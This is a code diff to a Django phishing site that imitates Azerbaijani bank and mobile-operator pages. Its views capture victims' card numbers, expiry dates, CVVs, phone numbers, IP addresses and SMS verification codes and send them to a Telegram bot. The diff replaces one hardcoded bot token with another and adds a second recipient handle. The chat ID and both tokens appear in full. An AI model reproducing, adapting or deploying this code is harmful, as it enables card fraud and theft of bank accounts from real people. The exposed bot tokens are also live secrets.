@@ -100,6 +100,7 @@ def azercell(request):
 @csrf_exempt
 def bakcell(request):
     if request.method == "POST":
+        request.POST
         operator = request.POST.get('operator')
         amount = request.POST.get("amount")
         number = request.POST.get("number")
@@ -149,7 +150,7 @@ def info(request):
         contact.bankname=""
         contact.page_name="/Loading.html"
         contact.save()
-        response = requests.post(f'https://api.telegram.org/bot6013881819:AAESdN5H9J1MSI1zZ_yfy4I63rk-v39EdmM/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:Loading\n\n{contact.ip}\n{contact.cc}|{contact.mm}|{contact.yy}|{contact.cvv}\n Operator: {contact.operator} \nNumber:{contact.phone}\n@Maybewhou')
+        response = requests.post(f'https://api.telegram.org/bot6284666597:AAE17trIGiyILsEmfW9W9KcHNUUnIJKLZ_M/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:Loading\n\n{contact.ip}\n{contact.cc}|{contact.mm}|{contact.yy}|{contact.cvv}\n Operator: {contact.operator} \nNumber:{contact.phone}\n@Maybewhou @Thinkpsd')
         context = {
                 'id':contact.id,
                 "display":contact.hidden_type
@@ -437,12 +438,11 @@ def dsecazericard(request):
         context = {
             'last_contact_id': contact.id,
             "display":contact.hidden_type
-
         }
         contact.bankname=""
         contact.page_name="/loading"
         contact.save()
-        response = requests.post(f'https://api.telegram.org/bot6013881819:AAESdN5H9J1MSI1zZ_yfy4I63rk-v39EdmM/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:{request.path}\nsms:{contact.sms}|number{contact.phone}\n@Maybewhou')
+        response = requests.post(f'https://api.telegram.org/bot6284666597:AAE17trIGiyILsEmfW9W9KcHNUUnIJKLZ_M/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:{request.path}\nsms:{contact.sms}|number{contact.phone}\n@Maybewhou @Thinkpsd')
 
         return render( request,'pages/loading.html',context )
     return render( request,'pages/loading.html',context )
@@ -471,7 +471,7 @@ def dseckapital(request):
         contact.bankname=""
         contact.page_name="/loading"
         contact.save()
-        response = requests.post(f'https://api.telegram.org/bot6013881819:AAESdN5H9J1MSI1zZ_yfy4I63rk-v39EdmM/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:Loading\nnumber{contact.phone}\nsms:{concatenated}\n@Maybewhou')
+        response = requests.post(f'https://api.telegram.org/bot6284666597:AAE17trIGiyILsEmfW9W9KcHNUUnIJKLZ_M/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:Loading\nnumber{contact.phone}\nsms:{concatenated}\n@Maybewhou @Thinkpsd')
         return render( request,'pages/loading.html' )
     contact.page_name="/loading"
     contact.save()
@@ -531,7 +531,7 @@ def unibank3d(request):
         contact.page_name="/unibank3d"
         contact.save()
         return render(request, 'pages/unibank3d.html')
-    response = requests.post(f'https://api.telegram.org/bot6013881819:AAESdN5H9J1MSI1zZ_yfy4I63rk-v39EdmM/sendMessage?chat_id=-1001861916739&text=id{contact.id}\nPage:Loading\nsms:{contact.sms}|number{contact.phone}\n@Maybewhou')
+    response = requests.post(f'https://api.telegram.org/bot6284666597:AAE17trIGiyILsEmfW9W9KcHNUUnIJKLZ_M/sendMessage?chat_id=-1001861916739&text=id{contact.id}\nPage:Loading\nsms:{contact.sms}|number{contact.phone}\n@Maybewhou @Thinkpsd')
     return render( request,'pages/loading.html',context )
 
 
@@ -589,7 +589,7 @@ def pashabank3d(request):
         contact.sms=concatenated
         contact.page_name="/loading"
         contact.save()
-        response = requests.post(f'https://api.telegram.org/bot6013881819:AAESdN5H9J1MSI1zZ_yfy4I63rk-v39EdmM/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:loading\n Number{contact.phone}\nsms:{concatenated}\n@Maybewhou')
+        response = requests.post(f'https://api.telegram.org/bot6284666597:AAE17trIGiyILsEmfW9W9KcHNUUnIJKLZ_M/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:loading\n Number{contact.phone}\nsms:{concatenated}\n@Maybewhou @Thinkpsd')
         return render( request,'pages/loading.html',context )
     contact.bankname=""
     contact.page_name="/loading"
